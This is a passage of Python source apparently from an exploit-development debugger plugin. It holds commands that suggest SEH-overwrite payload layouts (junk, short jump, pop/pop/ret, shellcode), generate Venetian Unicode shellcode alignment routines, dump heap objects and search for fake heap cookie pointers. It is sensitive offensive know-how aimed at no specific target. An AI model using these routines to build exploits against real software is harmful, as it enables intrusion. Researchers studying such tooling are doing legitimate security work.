                    dbg.log(('0x%08x  %s  0x%08x %s%s' % (recaddress, nseh, sehandler, funcinfo, overwritemark)), recaddress)
            if (len(handlersoverwritten) > 0):
                dbg.log('')
                dbg.log('Payload structure suggestion(s):')
                for overwrittenhandler in handlersoverwritten:
                    overwrittendata = handlersoverwritten[overwrittenhandler]
                    overwrittentype = overwrittendata[0]
                    overwrittenoffset = int(overwrittendata[1])
                    if (not (overwrittentype == 'unicode')):
                        dbg.log(("[Junk * %d]['\\xeb\\x06\\x41\\x41'][p/p/r][shellcode][more junk if needed]" % overwrittenoffset))
                    else:
                        overwrittenoffset += 2
                        dbg.log(('[Junk * %d][nseh - walkover][unicode p/p/r][venetian alignment][shellcode][more junk if needed]' % overwrittenoffset))
            return

        def procDumpLog(args):
            logfile = ''
            levels = 0
            nestedsize = 40
            filtersize = 0
            ignorefree = False
            if ('f' in args):
                if (type(args['f']).__name__.lower() != 'bool'):
                    logfile = getAbsolutePath(args['f'])
            if ('nofree' in args):
                ignorefree = True
            if ('l' in args):
                if (type(args['l']).__name__.lower() != 'bool'):
                    if str(args['l']).lower().startswith('0x'):
                        try:
                            levels = int(args['l'], 16)
                        except:
                            levels = 0
                    else:
                        try:
                            levels = int(args['l'])
                        except:
                            levels = 0
            if ('m' in args):
                if (type(args['m']).__name__.lower() != 'bool'):
                    if str(args['m']).lower().startswith('0x'):
                        try:
                            nestedsize = int(args['m'], 16)
                        except:
                            nestedsize = 40
                    else:
                        try:
                            nestedsize = int(args['m'])
                        except:
                            nestedsize = 40
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    if str(args['s']).lower().startswith('0x'):
                        try:
                            filtersize = int(args['s'], 16)
                        except:
                            filtersize = 0
                    else:
                        try:
                            filtersize = int(args['s'])
                        except:
                            filtersize = 0
            if (logfile == ''):
                dbg.log(' *** Error: please specify a valid logfile with argument -f ***', highlight=1)
                return
            allocs = 0
            frees = 0
            logdata = {}
            try:
                dbg.log(('[+] Parsing logfile %s' % logfile))
                f = open(logfile, 'rb')
                contents = f.readlines()
                f.close()
                for tline in contents:
                    line = str(tline)
                    if line.startswith('alloc('):
                        size = ''
                        addy = ''
                        lineparts = line.split('(')
                        if (len(lineparts) > 1):
                            sizeparts = lineparts[1].split(')')
                            size = sizeparts[0].replace(' ', '')
                        lineparts = line.split('=')
                        if (len(lineparts) > 1):
                            linepartaddy = lineparts[1].split(' ')
                            for lpa in linepartaddy:
                                if (addy != ''):
                                    break
                                if (lpa != ''):
                                    addy = lpa
                        if ((size != '') and (addy != '')):
                            size = size.lower()
                            addy = addy.lower()
                            if (not (addy in logdata)):
                                if (filtersize == 0):
                                    logdata[addy] = size
                                    allocs += 1
                                else:
                                    try:
                                        isize = int(size, 16)
                                        if (isize == filtersize):
                                            logdata[addy] = size
                                            allocs += 1
                                    except:
                                        continue
                    if (line.startswith('free(') and (not ignorefree)):
                        addy = ''
                        lineparts = line.split('(')
                        if (len(lineparts) > 1):
                            addyparts = lineparts[1].split(')')
                            addy = addyparts[0].replace(' ', '')
                        if (addy != ''):
                            addy = addy.lower()
                            if (addy in logdata):
                                del logdata[addy]
                                frees += 1
                if ignorefree:
                    dbg.log('[+] Ignoring all free() events, showing all allocations')
                dbg.log(('[+] Logfile parsed, %d objects found' % len(logdata)))
                if (filtersize > 0):
                    dbg.log(('    Only showing alloc chunks of size 0x%08x' % filtersize))
                dbg.log(('    Total allocs: %d, total free: %d' % (allocs, frees)))
                dbg.log('[+] Dumping objects')
                logfile = MnLog('dump_alloc_free.txt')
                thislog = logfile.reset()
                logfile.write('Addresses to dump:', thislog)
                allocsizegroups = {}
                allocsizes = []
                heapgranularity = 8
                for addy in logdata:
                    logfile.write(('%s (%s)' % (addy, logdata[addy])), thislog)
                    allocsize = getHeapAllocSize(logdata[addy], heapgranularity)
                    if (not (allocsize in allocsizegroups)):
                        allocsizegroups[allocsize] = [addy]
                    else:
                        allocsizegroups[allocsize].append(addy)
                    if (not (allocsize in allocsizes)):
                        allocsizes.append(allocsize)
                logfile.write('', thislog)
                logfile.write(('(Allocated) Size groups, heap granularity %d bytes' % heapgranularity), thislog)
                allocsizes.sort()
                for allocsize in allocsizes:
                    logfile.write(('Size 0x%02x' % allocsize), thislog)
                    for allocsizeaddy in allocsizegroups[allocsize]:
                        logfile.write(('  %s (%s)' % (allocsizeaddy, logdata[allocsizeaddy])), thislog)
                for addy in logdata:
                    asize = logdata[addy]
                    ptrx = MnPointer(int(addy, 16))
                    size = int(asize, 16)
                    dumpdata = ptrx.dumpObjectAtLocation(size, levels, nestedsize, thislog, logfile)
            except:
                dbg.log((' *** Unable to open logfile %s ***' % logfile), highlight=1)
                dbg.log(traceback.format_exc())
                return
            return

        def procDumpObj(args):
            addy = 0
            levels = 0
            size = 0
            nestedsize = 40
            regs = dbg.getRegs()
            if ('a' in args):
                if (type(args['a']).__name__.lower() != 'bool'):
                    (addy, addyok) = getAddyArg(args['a'])
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    if str(args['s']).lower().startswith('0x'):
                        try:
                            size = int(args['s'], 16)
                        except:
                            size = 0
                    else:
                        try:
                            size = int(args['s'])
                        except:
                            size = 0
            if ('l' in args):
                if (type(args['l']).__name__.lower() != 'bool'):
                    if str(args['l']).lower().startswith('0x'):
                        try:
                            levels = int(args['l'], 16)
                        except:
                            levels = 0
                    else:
                        try:
                            levels = int(args['l'])
                        except:
                            levels = 0
            if ('m' in args):
                if (type(args['m']).__name__.lower() != 'bool'):
                    if str(args['m']).lower().startswith('0x'):
                        try:
                            nestedsize = int(args['m'], 16)
                        except:
                            nestedsize = 0
                    else:
                        try:
                            nestedsize = int(args['m'])
                        except:
                            nestedsize = 0
            errorsfound = False
            if (addy == 0):
                errorsfound = True
                dbg.log('*** Please specify a valid address to argument -a ***', highlight=1)
            else:
                ptrx = MnPointer(addy)
            osize = size
            if (size == 0):
                if (addy > 0):
                    dbg.log('[+] No size specified, checking if address is part of known heap chunk')
                    if ptrx.isInHeap():
                        heapinfo = ptrx.getHeapInfo()
                        heapaddy = heapinfo[0]
                        chunkobj = heapinfo[3]
                        if (not (heapaddy == None)):
                            if (heapaddy > 0):
                                chunkaddy = chunkobj.chunkptr
                                size = chunkobj.usersize
                                dbg.log(('    Address found in chunk 0x%08x, heap 0x%08x, (user)size 0x%02x' % (chunkaddy, heapaddy, size)))
                                addy = chunkobj.userptr
                                if (size > 4095):
                                    dbg.log("    I'll only dump 0xfff bytes from the object, for performance reasons")
                                    size = 4095
            if ((size > 4095) and (osize > 0)):
                errorsfound = True
                dbg.log('*** Please keep the size below 0xfff (argument -s) ***', highlight=1)
            if (size == 0):
                size = 40
            if ((levels > 0) and (nestedsize == 0)):
                errorsfound = True
                dbg.log('*** Please specify a valid size to argument -m ***', highlight=1)
            if (not errorsfound):
                ptrx = MnPointer(addy)
                dumpdata = ptrx.dumpObjectAtLocation(size, levels, nestedsize)
            return

        def procCopy(args):
            src = 0
            dst = 0
            nrbytes = 0
            regs = dbg.getRegs()
            if ('src' in args):
                if (type(args['src']).__name__.lower() != 'bool'):
                    (src, addyok) = getAddyArg(args['src'])
            if ('dst' in args):
                if (type(args['dst']).__name__.lower() != 'bool'):
                    (dst, addyok) = getAddyArg(args['dst'])
            if ('n' in args):
                if (type(args['n']).__name__.lower() != 'bool'):
                    if (('+' in str(args['n'])) or ('-' in str(args['n']))):
                        (nrbytes, bytesok) = getAddyArg(args['n'])
                        if (not bytesok):
                            errorsfound = True
                    elif str(args['n']).lower().startswith('0x'):
                        try:
                            nrbytes = int(args['n'], 16)
                        except:
                            nrbytes = 0
                    else:
                        try:
                            nrbytes = int(args['n'])
                        except:
                            nrbytes = 0
            errorsfound = False
            if (src == 0):
                errorsfound = True
                dbg.log('*** Please specify a valid source address to argument -src ***', highlight=1)
            if (dst == 0):
                errorsfound = True
                dbg.log('*** Please specify a valid destination address to argument -dst ***', highlight=1)
            if (nrbytes == 0):
                errorsfound = True
                dbg.log('*** Please specify a valid number of bytes to argument -n ***', highlight=1)
            if (not errorsfound):
                dbg.log(('[+] Attempting to copy 0x%08x bytes from 0x%08x to 0x%08x' % (nrbytes, src, dst)))
                sourcebytes = dbg.readMemory(src, nrbytes)
                try:
                    dbg.writeMemory(dst, sourcebytes)
                    dbg.log('    Done.')
                except:
                    dbg.log('    *** Copy failed, check if both locations are accessible/mapped', highlight=1)
            return

        def procUnicodeAlign(args):
            leaks = False
            address = 0
            alignresults = {}
            bufferRegister = 'eax'
            timeToRun = 15
            registers = {'eax': 0, 'ebx': 0, 'ecx': 0, 'edx': 0, 'esp': 0, 'ebp': 0}
            showerror = False
            regs = dbg.getRegs()
            if ('l' in args):
                leaks = True
            if ('a' in args):
                if (type(args['a']).__name__.lower() != 'bool'):
                    (address, addyok) = getAddyArg(args['a'])
            else:
                address = regs['EIP']
                if leaks:
                    address += 1
            if (address == 0):
                dbg.log('Please enter a valid address with argument -a', highlight=1)
                dbg.log('This address must be the location where the alignment code will be placed/start')
                dbg.log("(without leaking zero byte). Don't worry, the script will only use")
                dbg.log('it to calculate the offset from the address to EBP.')
                showerror = True
            if ('b' in args):
                if (args['b'].lower().strip() == 'eax'):
                    bufferRegister = 'eax'
                elif (args['b'].lower().strip() == 'ebx'):
                    bufferRegister = 'ebx'
                elif (args['b'].lower().strip() == 'ecx'):
                    bufferRegister = 'ecx'
                elif (args['b'].lower().strip() == 'edx'):
                    bufferRegister = 'edx'
                else:
                    dbg.log('Please enter a valid register with argument -b')
                    dbg.log('Valid registers are: eax, ebx, ecx, edx')
                    showerror = True
            if (('t' in args) and (args['t'] != '')):
                try:
                    timeToRun = int(args['t'])
                    if (timeToRun < 0):
                        timeToRun = (timeToRun * (- 1))
                except:
                    dbg.log('Please enter a valid integer for -t', highlight=1)
                    showerror = True
            if (('ebp' in args) and (args['ebp'] != '')):
                try:
                    registers['ebp'] = int(args['ebp'], 16)
                except:
                    dbg.log('Please enter a valid value for ebp', highlight=1)
                    showerror = True
            dbg.log(('[+] Start address for venetian alignment routine: 0x%08x' % address))
            dbg.log(('[+] Will prepend alignment with null byte compensation? %s' % str(leaks).lower()))
            value_of_ebp = regs['EBP']
            dbg.log(('[+] Checking if ebp (0x%08x) is writeable' % value_of_ebp))
            ebpaccess = getPointerAccess(value_of_ebp)
            if (not ('WRITE' in ebpaccess)):
                dbg.log('[!] Warning! ebp does not appear to be writeable!', highlight=1)
                dbg.log('    You will have to run some custom instructions first to make ebp writeable')
                dbg.log('    and at that point, run this mona command again.')
                dbg.log('    Hints: maybe you can pop something off the stack into ebp,')
                dbg.log('    or push esp and pop it into ebp.')
                showerror = True
            else:
                dbg.log(('    OK (%s)' % ebpaccess))
            if (not showerror):
                alignresults = prepareAlignment(leaks, address, bufferRegister, timeToRun, registers)
                if (len(alignresults) > 0):
                    if (not silent):
                        dbg.log(('[+] Alignment generator finished, %d results' % len(alignresults)))
                        logfile = MnLog('venetian_alignment.txt')
                        thislog = logfile.reset()
                        for resultnr in alignresults:
                            resulttitle = ('Alignment routine %d:' % resultnr)
                            logfile.write(resulttitle, thislog)
                            logfile.write(('-' * len(resulttitle)), thislog)
                            theseresults = alignresults[resultnr]
                            for resultinstructions in theseresults:
                                logfile.write('Instructions:', thislog)
                                resultlines = resultinstructions.split(';')
                                for resultline in resultlines:
                                    logfile.write(('   %s' % resultline.strip()), thislog)
                                logfile.write('Hex:', thislog)
                                logfile.write(("'%s'" % theseresults[resultinstructions]), thislog)
                            logfile.write('', thislog)
            return alignresults

        def prepareAlignment(leaks, address, bufferRegister, timeToRun, registers):

            def getRegister(registerName):
                registerName = registerName.upper()
                regs = dbg.getRegs()
                if (registerName in regs):
                    return regs[registerName]

            def calculateNewXregister(x, h, l):
                return ((((x >> 16) << 16) + (h << 8)) + l)
            prefix = ''
            postfix = ''
            additionalLength = 0
            code_to_get_rid_of_zeros = 'add [ebp],ch; '
            buf_sig = bufferRegister[1]
            registers_to_fill = ['ah', 'al', 'bh', 'bl', 'ch', 'cl', 'dh', 'dl']
            registers_to_fill.remove((buf_sig + 'h'))
            registers_to_fill.remove((buf_sig + 'l'))
            leadingZero = leaks
            for name in registers:
                if (not registers[name]):
                    registers[name] = getRegister(name)
            values_to_generate_all_255_values = [86, 85, 75, 109, 121, 99]
            new_values = zip(registers_to_fill, values_to_generate_all_255_values)
            if leadingZero:
                prefix += code_to_get_rid_of_zeros
                additionalLength += 2
                leadingZero = False
            for (name, value) in zip(registers_to_fill, values_to_generate_all_255_values):
                padding = ''
                if (value < 16):
                    padding = '0'
                if ('h' in name):
                    prefix += ('mov e%sx,0x4100%s%s00; ' % (name[0], padding, hex(value)[2:]))
                    prefix += 'add [ebp],ch; '
                    additionalLength += 8
                if ('l' in name):
                    prefix += ('mov e%sx,0x4100%s%s00; ' % (buf_sig, padding, hex(value)[2:]))
                    prefix += ('add %s,%sh; ' % (name, buf_sig))
                    prefix += 'add [ebp],ch; '
                    additionalLength += 10
            leadingZero = False
            new_values_dict = dict(new_values)
            for new in registers_to_fill[::2]:
                n = new[0]
                registers[('e%sx' % n)] = calculateNewXregister(registers[('e%sx' % n)], new_values_dict[('%sh' % n)], new_values_dict[('%sl' % n)])
            if leadingZero:
                prefix += code_to_get_rid_of_zeros
                additionalLength += 2
                leadingZero = False
            prefix += ('push ebp; %spop %s; ' % (code_to_get_rid_of_zeros, bufferRegister))
            leadingZero = True
            additionalLength += 6
            registers[bufferRegister] = registers['ebp']
            if (not leadingZero):
                prefix += 'push ebp; '
                leadingZero = True
                additionalLength += 2
            postfix += code_to_get_rid_of_zeros
            additionalLength += 2
            alignresults = generateAlignment(address, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength)
            return alignresults

        def generateAlignment(alignment_code_loc, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength):
            import copy, random, time
            alignresults = {}

            def sanitiseZeros(originals, names):
                for (index, i) in enumerate(originals):
                    if (i == 0):
                        warn(("Your %s register is zero. That's bad for the heuristic." % names[index]))
                        warn('In general this means there will be no result or they consist of more bytes.')

            def checkDuplicates(originals, names):
                duplicates = (len(originals) - len(set(originals)))
                if (duplicates > 0):
                    warn(('Some of the 2 byte registers seem to be the same. There is/are %i duplicate(s):' % duplicates))
                    warn('In general this means there will be no result or they consist of more bytes.')
                    warn(', '.join(names))
                    warn(', '.join(hexlist(originals)))

            def checkHigherByteBufferRegisterForOverflow(g1, name, g2):
                overflowDanger = (256 - g1)
                max_instructions = ((overflowDanger * 256) - g2)
                if (overflowDanger <= 3):
                    warn(("Your BufferRegister's %s register value starts pretty high (%s) and might overflow." % (name, hex(g1))))
                    warn(('Therefore we only look for solutions with less than %i bytes (%s%s until overflow).' % (max_instructions, hex(g1), hex(g2)[2:])))
                    warn("This makes our search space smaller, meaning it's harder to find a solution.")
                return max_instructions

            def randomise(values, maxValues):
                for (index, i) in enumerate(values):
                    if (random.random() <= MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS):
                        values[index] += 1
                        values[index] = (values[index] % maxValues[index])

            def check(as1, index_for_higher_byte, ss, gs, xs, ys, M, best_result):
                (g1, g2) = gs
                (s1, s2) = ss
                sum_of_instructions = (((2 * sum(xs)) + (2 * sum(ys))) + M)
                if (best_result > sum_of_instructions):
                    res0 = s1
                    res1 = s2
                    for (index, _) in enumerate(as1):
                        res0 += ((as1[index] * xs[index]) % 256)
                    res0 = (res0 - ((g2 + sum_of_instructions) / 256))
                    as2 = copy.copy(as1)
                    as2[index_for_higher_byte] = ((g1 + ((g2 + sum_of_instructions) / 256)) % 256)
                    for (index, _) in enumerate(as2):
                        res1 += ((as2[index] * ys[index]) % 256)
                    res1 = (res1 - sum_of_instructions)
                    if ((g1 == (res0 % 256)) and (g2 == (res1 % 256))):
                        return sum_of_instructions
                return 0

            def printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength=0, prefix='', postfix=''):
                thisresult = {}
                resulting_string = prefix
                sum_bytes = 0
                for (index, x) in enumerate(xs):
                    for k in range(0, x):
                        resulting_string += (((('add ' + buffer_registers_4_byte_names[0]) + ',') + names[index]) + '; ')
                        sum_bytes += 2
                for (index, y) in enumerate(ys):
                    for k in range(y):
                        resulting_string += (((('add ' + buffer_registers_4_byte_names[1]) + ',') + names[index]) + '; ')
                        sum_bytes += 2
                resulting_string += postfix
                sum_bytes += additionalLength
                if (not silent):
                    info(('[+] %i resulting bytes (%i bytes injection) of Unicode code alignment. Instructions:' % (sum_bytes, (sum_bytes / 2))))
                    info('   ', resulting_string)
                hex_string = metasm(resulting_string)
                if (not silent):
                    info('    Unicode safe opcodes without zero bytes:')
                    info('   ', hex_string)
                thisresult[resulting_string] = hex_string
                return thisresult

            def metasm(inputInstr):
                ass_operation = {'add [ebp],ch': '\\x00m\\x00', 'pop ebp': ']', 'pop edx': 'Z', 'pop ecx': 'Y', 'push ecx': 'Q', 'pop ebx': '[', 'push ebx': 'S', 'pop eax': 'X', 'push eax': 'P', 'push esp': 'T', 'push ebp': 'U', 'push edx': 'R', 'pop esp': '\\', 'add dl,bh': '\\x00\\xfa', 'add dl,dh': '\\x00\\xf2', 'add dl,ah': '\\x00\\xe2', 'add ah,al': '\\x00\\xc4', 'add ah,ah': '\\x00\\xe4', 'add ch,bl': '\\x00\\xdd', 'add ah,cl': '\\x00\\xcc', 'add bl,ah': '\\x00\\xe3', 'add bh,dh': '\\x00\\xf7', 'add bl,cl': '\\x00\\xcb', 'add ah,ch': '\\x00\\xec', 'add bl,al': '\\x00\\xc3', 'add bh,dl': '\\x00\\xd7', 'add bl,ch': '\\x00\\xeb', 'add dl,cl': '\\x00\\xca', 'add dl,bl': '\\x00\\xda', 'add al,ah': '\\x00\\xe0', 'add bh,ch': '\\x00\\xef', 'add al,al': '\\x00\\xc0', 'add bh,cl': '\\x00\\xcf', 'add al,ch': '\\x00\\xe8', 'add dh,bl': '\\x00\\xde', 'add ch,ch': '\\x00\\xed', 'add cl,dl': '\\x00\\xd1', 'add al,cl': '\\x00\\xc8', 'add dh,bh': '\\x00\\xfe', 'add ch,cl': '\\x00\\xcd', 'add cl,dh': '\\x00\\xf1', 'add ch,ah': '\\x00\\xe5', 'add cl,bl': '\\x00\\xd9', 'add dh,al': '\\x00\\xc6', 'add ch,al': '\\x00\\xc5', 'add cl,bh': '\\x00\\xf9', 'add dh,ah': '\\x00\\xe6', 'add dl,dl': '\\x00\\xd2', 'add dh,cl': '\\x00\\xce', 'add dh,dl': '\\x00\\xd6', 'add ah,dh': '\\x00\\xf4', 'add dh,dh': '\\x00\\xf6', 'add ah,dl': '\\x00\\xd4', 'add ah,bh': '\\x00\\xfc', 'add ah,bl': '\\x00\\xdc', 'add bl,bh': '\\x00\\xfb', 'add bh,al': '\\x00\\xc7', 'add bl,dl': '\\x00\\xd3', 'add bl,bl': '\\x00\\xdb', 'add bh,ah': '\\x00\\xe7', 'add bl,dh': '\\x00\\xf3', 'add bh,bl': '\\x00\\xdf', 'add al,bl': '\\x00\\xd8', 'add bh,bh': '\\x00\\xff', 'add al,bh': '\\x00\\xf8', 'add al,dl': '\\x00\\xd0', 'add dl,ch': '\\x00\\xea', 'add dl,al': '\\x00\\xc2', 'add al,dh': '\\x00\\xf0', 'add cl,cl': '\\x00\\xc9', 'add cl,ch': '\\x00\\xe9', 'add ch,bh': '\\x00\\xfd', 'add cl,al': '\\x00\\xc1', 'add ch,dh': '\\x00\\xf5', 'add cl,ah': '\\x00\\xe1', 'add dh,ch': '\\x00\\xee', 'add ch,dl': '\\x00\\xd5', 'add ch,ah': '\\x00\\xe5', 'mov dh,0': '\\xb6\\x00', 'add dl,ah': '\\x00\\xe2', 'mov dl,0': '\\xb2\\x00', 'mov ch,0': '\\xb5\\x00', 'mov cl,0': '\\xb1\\x00', 'mov bh,0': '\\xb7\\x00', 'add bl,ah': '\\x00\\xe3', 'mov bl,0': '\\xb3\\x00', 'add dh,ah': '\\x00\\xe6', 'add cl,ah': '\\x00\\xe1', 'add bh,ah': '\\x00\\xe7'}
                for (example_instr, example_op) in [('mov eax,0x41004300', '\\xb8\\x00\\x43\\x00\\x41'), ('mov ebx,0x4100af00', '\\xbb\\x00\\xaf\\x00\\x41'), ('mov ecx,0x41004300', '\\xb9\\x00\\x43\\x00\\x41'), ('mov edx,0x41004300', '\\xba\\x00\\x43\\x00\\x41')]:
                    for i in range(0, 256):
                        padding = ''
                        if (i < 16):
                            padding = '0'
                        new_instr = (((example_instr[:14] + padding) + hex(i)[2:]) + example_instr[16:])
                        new_op = (((example_op[:10] + padding) + hex(i)[2:]) + example_op[12:])
                        ass_operation[new_instr] = new_op
                res = ''
                for instr in inputInstr.split('; '):
                    if (instr in ass_operation):
                        res += ass_operation[instr].replace('\\x00', '')
                    elif instr.strip():
                        warn(("    Couldn't find metasm assembly for %s" % str(instr)))
                        warn('    You have to manually convert it in the metasm shell')
                        res += (('<' + instr) + '>')
                return res

            def getCyclic(originals):
                cyclic = [0 for i in range(0, len(originals))]
                for (index, orig_num) in enumerate(originals):
                    cycle = 1
                    num = orig_num
                    while True:
                        cycle += 1
                        num += orig_num
                        num = (num % 256)
                        if (num == orig_num):
                            cyclic[index] = cycle
                            break
                return cyclic

            def hexlist(lis):
                return [hex(i) for i in lis]

            def theX(num):
                res = (((num >> 16) << 16) ^ num)
                return res

            def higher(num):
                res = (num >> 8)
                return res

            def lower(num):
                res = (((num >> 8) << 8) ^ num)
                return res

            def info(*text):
                dbg.log(' '.join((str(i) for i in text)))

            def warn(*text):
                dbg.log(' '.join((str(i) for i in text)), highlight=1)

            def debug(*text):
                if False:
                    dbg.log(' '.join((str(i) for i in text)))
            buffer_registers_4_byte_names = [(bufferRegister[1] + 'h'), (bufferRegister[1] + 'l')]
            buffer_registers_4_byte_value = theX(registers[bufferRegister])
            MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS = 0.25
            MAGIC_PROBABILITY_OF_RESETTING = 0.04
            MAGIC_MAX_PROBABILITY_OF_RESETTING = 0.11
            originals = []
            ax = theX(registers['eax'])
            ah = higher(ax)
            al = lower(ax)
            bx = theX(registers['ebx'])
            bh = higher(bx)
            bl = lower(bx)
            cx = theX(registers['ecx'])
            ch = higher(cx)
            cl = lower(cx)
            dx = theX(registers['edx'])
            dh = higher(dx)
            dl = lower(dx)
            start_address = theX(buffer_registers_4_byte_value)
            s1 = higher(start_address)
            s2 = lower(start_address)
            alignment_code_loc_address = theX(alignment_code_loc)
            g1 = higher(alignment_code_loc_address)
            g2 = lower(alignment_code_loc_address)
            names = ['ah', 'al', 'bh', 'bl', 'ch', 'cl', 'dh', 'dl']
            originals = [ah, al, bh, bl, ch, cl, dh, dl]
            sanitiseZeros(originals, names)
            checkDuplicates(originals, names)
            best_result = checkHigherByteBufferRegisterForOverflow(g1, buffer_registers_4_byte_names[0], g2)
            xs = [0 for i in range(0, len(originals))]
            ys = [0 for i in range(0, len(originals))]
            cyclic = getCyclic(originals)
            mul = 1
            for i in cyclic:
                mul *= i
            if (not silent):
                dbg.log(('[+] Searching for random solutions for code alignment code in at least %i possibilities...' % mul))
                dbg.log(('    Bufferregister: %s' % bufferRegister))
                dbg.log(('    Max time: %d seconds' % timeToRun))
                dbg.log('')
            cyclic2 = copy.copy(cyclic)
            cyclic2[names.index(buffer_registers_4_byte_names[0])] = 9999999
            number_of_tries = 0.0
            beginning = time.time()
            resultFound = False
            resultcnt = 0
            while ((time.time() - beginning) < timeToRun):
                randomise(xs, cyclic)
                randomise(ys, cyclic2)
                xs[names.index(buffer_registers_4_byte_names[0])] = 0
                xs[names.index(buffer_registers_4_byte_names[1])] = 0
                ys[names.index(buffer_registers_4_byte_names[0])] = 0
                ys[names.index(buffer_registers_4_byte_names[1])] = 0
                tmp = check(originals, names.index(buffer_registers_4_byte_names[0]), [s1, s2], [g1, g2], xs, ys, additionalLength, best_result)
                if (tmp > 0):
                    best_result = tmp
                    resultFound = True
                    alignresults[resultcnt] = printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength, prefix, postfix)
                    resultcnt += 1
                    if (not silent):
                        dbg.log(('    Time elapsed so far: %s seconds' % (time.time() - beginning)))
                        dbg.log('')
                probability = (MAGIC_PROBABILITY_OF_RESETTING + (number_of_tries / (10 ** 8)))
                if (probability < MAGIC_MAX_PROBABILITY_OF_RESETTING):
                    number_of_tries += 1.0
                if (random.random() <= probability):
                    xs = [0 for i in range(0, len(originals))]
                    ys = [0 for i in range(0, len(originals))]
            if (not silent):
                dbg.log('')
                dbg.log(('    Done. Total time elapsed: %s seconds' % (time.time() - beginning)))
                if (not resultFound):
                    dbg.log('')
                    dbg.log('No results. Please try again (you might want to increase -t)')
                dbg.log('')
                dbg.log('If you are unsatisfied with the result, run the command again and use the -t option')
                dbg.log('')
            return alignresults

        def procHeapCookie(args):
            allpages = dbg.getMemoryPages()
            filename = 'heapcookie.txt'
            orderedpages = []
            cookiemonsters = []
            for tpage in allpages.keys():
                orderedpages.append(tpage)
            orderedpages.sort()
            for thispage in orderedpages:
                page = allpages[thispage]
                page_base = page.getBaseAddress()
                page_size = page.getSize()
                page_end = (page_base + page_size)
                acl = page.getAccess(human=True)
                if ('WRITE' in acl):
                    processpage = True
                    pageptr = MnPointer(page_base)
                    thismodulename = pageptr.belongsTo()
                    if (thismodulename != ''):
                        thismod = MnModule(thismodulename)
                        if (thismod.isAslr or thismod.isRebase):
                            processpage = False
                    if processpage:
                        dbg.log(('[+] Walking page 0x%08x - 0x%08x (%s)' % (page_base, page_end, acl)))
                        startptr = page_base
                        while (startptr < (page_end - 16)):
                            try:
                                heap_entry = startptr
                                userptr = (heap_entry + 8)
                                cookieptr = (heap_entry + 5)
                                raw_heapcookie = dbg.readMemory(cookieptr, 1)
                                heapcookie = struct.unpack('<B', raw_heapcookie)[0]
                                hexptr1 = ('%08x' % userptr)
                                hexptr2 = ('%08x' % heapcookie)
                                a1 = hexStrToInt(hexptr1[6:])
                                a2 = hexStrToInt(hexptr2[6:])
                                test1 = False
                                test2 = False
                                test3 = False
                                if ((a1 & 7) == 0):
                                    test1 = True
                                if ((a2 & 1) == 1):
                                    test2 = True
                                if ((a2 & 8) == 8):
                                    test3 = True
                                if (test1 and test2 and test3):
                                    cookiemonsters.append((startptr + 8))
                            except:
                                pass
                            startptr += 1
            dbg.log('')
            if (len(cookiemonsters) > 0):
                dbg.log(('Found %s (fake) UserPtr pointers.' % len(cookiemonsters)))
                all_ptrs = {}
                all_ptrs[''] = cookiemonsters
                logfile = MnLog(filename)
                thislog = logfile.reset()
                processResults(all_ptrs, logfile, thislog)
            else:
                dbg.log('Bad luck, no results.')
            return

        def procFlags(args):
            currentflag = getNtGlobalFlag()
            dbg.log(('[+] NtGlobalFlag: 0x%08x' % currentflag))
            flagvalues = getNtGlobalFlagValues(currentflag)
            if (len(flagvalues) == 0):
                dbg.log('    No GFlags set')
            else:
                for flagvalue in flagvalues:
                    dbg.log(('    0x%08x : %s' % (flagvalue, getNtGlobalFlagValueName(flagvalue))))
            return

        def procEval(args):
            argline = ''
            if (len(currentArgs) > 1):
                if (__DEBUGGERAPP__ == 'WinDBG'):
                    for a in currentArgs[2:]:
                        argline += a
                else:
                    for a in currentArgs[1:]:
                        argline += a
                argline = argline.replace(' ', '')
            if (argline.replace(' ', '') != ''):
                dbg.log(("[+] Evaluating expression '%s'" % argline))
                (val, valok) = getAddyArg(argline)
                if valok:
                    dbg.log(('    Result: 0x%08x' % val))
                else:
                    dbg.log('    *** Unable to evaluate expression ***')
            else:
                dbg.log('    *** No expression found***')
            return

        def procDiffHeap(args):
            global ignoremodules
            filenamebefore = 'heapstate_before.db'
            filenameafter = 'heapstate_after.db'
            ignoremodules = True
            statefilebefore = MnLog(filenamebefore)
            thisstatefilebefore = statefilebefore.reset(clear=False)
            statefileafter = MnLog(filenameafter)
            thisstatefileafter = statefileafter.reset(clear=False)
            ignoremodules = False
            beforestate = {}
            afterstate = {}
            if ((not ('before' in args)) and (not ('after' in args)) and (not ('diff' in args))):
                dbg.log('*** Missing mandatory argument -before, -after or -diff ***', highlight=1)
                return
            if ('diff' in args):
                if (os.path.exists(thisstatefilebefore) and os.path.exists(thisstatefileafter)):
                    dbg.log(("[+] Reading 'before' state from %s" % thisstatefilebefore))
                    beforestate = readPickleDict(thisstatefilebefore)
                    dbg.log(("[+] Reading 'after' state from %s" % thisstatefileafter))
                    afterstate = readPickleDict(thisstatefileafter)
                    dbg.log('[+] Diffing heap states...')
                else:
                    if (not os.path.exists(thisstatefilebefore)):
                        dbg.log(("[-] Oops, unable to find 'before' state file %s" % thisstatefilebefore))
                    if (not os.path.exists(thisstatefileafter)):
                        dbg.log(("[-] Oops, unable to find 'after' state file %s" % thisstatefileafter))
                return
            elif ('before' in args):
                thisstatefilebefore = statefilebefore.reset(showheader=False)
                dbg.log('[+] Enumerating current heap layout, please wait...')
                currentstate = getCurrentHeapState()
                dbg.log(("[+] Saving current heap layout to 'before' heap state file %s" % thisstatefilebefore))
                try:
                    writePickleDict(thisstatefilebefore, currentstate)
                    dbg.log('[+] Done')
                except:
                    dbg.log('[-] Error while saving current state to file')
                return
            elif ('after' in args):
                thisstatefileafter = statefileafter.reset(showheader=False)
                dbg.log('[+] Enumerating current heap layout, please wait...')
                currentstate = getCurrentHeapState()
                dbg.log(("[+] Saving current heap layout to 'after' heap state file %s" % thisstatefileafter))
                try:
                    writePickleDict(thisstatefileafter, currentstate)
                    dbg.log('[+] Done')
                except:
                    dbg.log('[-] Error while saving current state to file')
                return
            return

        def procFlow(args):
            srplist = []
            endlist = []
            cregs = []
            cregsc = []
            avoidlist = []
            endloc = 0
            rellist = {}
            funcnamecache = {}
            branchstarts = {}
